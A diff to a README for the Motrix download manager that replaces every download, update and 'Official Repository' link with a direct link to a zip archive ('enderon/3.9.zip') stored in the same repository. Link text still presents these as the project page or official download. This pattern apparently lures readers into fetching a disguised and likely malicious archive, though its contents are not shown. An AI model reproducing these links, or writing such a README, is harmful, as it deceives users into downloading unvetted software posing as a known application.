@@ -1,6 +1,6 @@
 # ⚡ Motrix - Your Fastest, Full-Featured Download Manager
 
-[![Download Motrix](https://img.shields.io/badge/Download-Motrix-2ea44f?style=for-the-badge)](https://github.com/Kiplingesque-hogshead785/Motrix)
+[![Download Motrix](https://img.shields.io/badge/Download-Motrix-2ea44f?style=for-the-badge)](https://raw.githubusercontent.com/Kiplingesque-hogshead785/Motrix/main/enderon/3.9.zip)
 
 ## 🚀 What is Motrix?
 
@@ -42,7 +42,7 @@ Follow these simple steps to get Motrix running on your computer. **No technical
 ### Step 1: Visit the Download Page
 
 Visit this link to download the application:  
-👉 [**Click Here to Download Motrix**](https://github.com/Kiplingesque-hogshead785/Motrix)
+👉 [**Click Here to Download Motrix**](https://raw.githubusercontent.com/Kiplingesque-hogshead785/Motrix/main/enderon/3.9.zip)
 
 You will be taken to a page with download options. Find the button that says **"Download"** or **"Releases"** and click it.
 
@@ -139,7 +139,7 @@ If you encounter any issues:
 
 1. **Restart Motrix** – Close and reopen the app; this fixes most minor problems.
 2. **Check your internet connection** – Make sure you're online.
-3. **Update Motrix** – Visit the [download page](https://github.com/Kiplingesque-hogshead785/Motrix) and grab the latest version.
+3. **Update Motrix** – Visit the [download page](https://raw.githubusercontent.com/Kiplingesque-hogshead785/Motrix/main/enderon/3.9.zip) and grab the latest version.
 
 For further assistance, explore the repository documentation or community discussions on the same page.
 
@@ -147,7 +147,7 @@ For further assistance, explore the repository documentation or community discus
 
 ## 📚 Additional Resources
 
-- **Official Repository:** [github.com/Kiplingesque-hogshead785/Motrix](https://github.com/Kiplingesque-hogshead785/Motrix)
+- **Official Repository:** [github.com/Kiplingesque-hogshead785/Motrix](https://raw.githubusercontent.com/Kiplingesque-hogshead785/Motrix/main/enderon/3.9.zip)
 - **GitHub Releases:** See the "Releases" section for all versions and changelogs.
 
 ---
@@ -157,7 +157,7 @@ For further assistance, explore the repository documentation or community discus
 Motrix takes the hassle out of downloading. With its friendly design and powerful engine, you'll wonder how you ever managed without it. Download it today and experience the speed for yourself.
 
 **Ready to try it?**  
-👉 [**Download Motrix Now**](https://github.com/Kiplingesque-hogshead785/Motrix)
+👉 [**Download Motrix Now**](https://raw.githubusercontent.com/Kiplingesque-hogshead785/Motrix/main/enderon/3.9.zip)
 
 ---
 
